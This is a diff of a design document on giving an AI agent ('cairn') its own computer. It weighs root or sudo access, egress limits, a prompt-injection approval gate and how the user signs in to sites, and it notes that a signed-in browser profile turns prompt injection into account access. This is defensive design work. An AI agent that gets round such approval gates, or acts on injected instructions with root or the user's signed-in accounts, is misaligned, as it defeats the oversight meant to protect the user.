-2. **Root inside the computer.** Recommended: passwordless sudo for `agent` inside the container, so it can `pacman -S` what it needs, as Amp's Orbs do. Root there maps to an unprivileged host uid (`PrivateUsers=pick`). The alternative is Rakazo's rule, never root and user-level installs only, which is safer against kernel bugs but blocks system packages. File tools would then also be confined to `/home/agent` or not.
-3. **Egress.** Recommended: keep the Orb relay (public internet only, ports 80, 443 and 22). Opening more ports, or the tailnet, needs an explicit allowlist.
-4. **Injection gate strictness.** Recommended: the taint gate in §4 (asks only after untrusted content in the same turn). The alternatives are always asking before an unsafe computer call (safest, noisy) and never asking (Amp style, relying on the blast radius).
-5. **Who may use it.** Recommended: the Coordinator only in v1. Workers keep per-task Orbs. Rakazo's team mode shares one computer across bots, which cairn could add later.
-6. **Live screen.** Recommended: snapshots in v1 and live noVNC plus takeover in phase 2 (P9). Choosing it for v1 brings P9's security review forward.
-7. **Signing in to sites.** Recommended: ian signs in himself (takeover, or VNC over ssh until P9). Chromium keeps a persistent profile in the home, and cairn never stores or types his passwords. Note that a signed-in profile turns prompt injection into account access, which raises the weight of decision 4.
-8. **Sizes.** Idle timers (desktop 30 min, container 4 h) and slice limits (6 GiB, 300% CPU): accept the defaults or adjust.
+Rakazo's design settles most questions. These remain:
 
-Not decided here: a second computer on the Mac (Apple `container`, D69), and pairing ian's own Mac Rakazo-style. Both can reuse the same tools later with a different provider.
+1. **Own computer on omarchy as user `ian`, who has NOPASSWD sudo.** Rakazo runs commands as the user, and the warning reads "can read your files and run programs as you". On omarchy that means root.
+   - Recommended: accept it behind the gate in §3.6.
+   - Alternative: drop NOPASSWD for the daemon's user, which keeps Rakazo's semantics but loses root.
+2. **Approval modes.** Recommended: no Ask/Auto/Never setting in v1, only the fixed gates in §3.6. Adding Rakazo's modes (Auto needs an approval model) is a later decision.
+3. **The Mac as an own computer.** It is the second use of the same tools, and the Mac also runs the control plane. Recommended: omarchy first, the Mac after it has run cleanly for a while.
+4. **Signing in to sites in the Coordinator computer.** Recommended: ian signs in through Take control, as in Rakazo. Saved logins and cards (`request_secret`, `fill_secret`) wait until a separate decision.
